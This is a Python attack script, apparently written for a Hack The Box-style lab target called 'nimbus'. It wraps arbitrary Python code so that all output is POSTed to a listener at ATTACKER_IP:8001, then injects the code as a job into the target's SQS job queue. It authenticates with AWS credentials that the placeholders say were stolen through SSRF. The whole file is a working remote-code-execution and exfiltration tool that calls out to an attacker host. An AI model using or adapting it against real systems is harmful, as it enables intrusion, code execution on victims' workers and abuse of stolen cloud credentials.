#!/usr/bin/env python3
"""sendjob.py <tag> <pyfile>
Reads a python script from <pyfile>, wraps it so all stdout/stderr is captured
and POSTed to http://ATTACKER_IP:8001/<tag>, then sends it as a worker job."""
import sys, os, subprocess, textwrap

LHOST = "ATTACKER_IP"
TAG = sys.argv[1]
PYFILE = sys.argv[2]
user_code = open(PYFILE).read()

wrapper = textwrap.dedent("""
import sys, io, traceback, urllib.request
_buf = io.StringIO()
sys.stdout = _buf; sys.stderr = _buf
try:
    exec(compile(__USERCODE__, "<job>", "exec"), {{}})
except Exception:
    traceback.print_exc()
sys.stdout = sys.__stdout__
data = _buf.getvalue().encode()
try:
    urllib.request.urlopen("http://{lhost}:8001/{tag}", data=data, timeout=15)
except Exception as e:
    pass
""").format(lhost=LHOST, tag=TAG)

# embed user code safely as a repr string
full = wrapper.replace("__USERCODE__", repr(user_code))
# indent two spaces under "script: |"
script_block = "\n".join("  " + l for l in full.splitlines())
body = "name: j-%s\nschedule: manual\nruntime: python3.11\nscript: |\n%s\n" % (TAG, script_block)

env = dict(os.environ)
env.update({
    "AWS_ACCESS_KEY_ID": "<ACCESS_KEY_FROM_SSRF>",
    "AWS_SECRET_ACCESS_KEY": "<SECRET_KEY_FROM_SSRF>",
    "AWS_SESSION_TOKEN": "<SESSION_TOKEN_FROM_SSRF>",
    "AWS_DEFAULT_REGION": "us-east-1",
})
cmd = ["aws", "--endpoint-url", "http://aws.nimbus.htb", "sqs", "send-message",
       "--queue-url", "http://aws.nimbus.htb/847219365028/nimbus-jobs",
       "--message-body", body]
r = subprocess.run(cmd, env=env, capture_output=True, text=True)
print("SENT job tag=%s (%d bytes script)" % (TAG, len(body)))
print(r.stdout.strip() or r.stderr.strip())
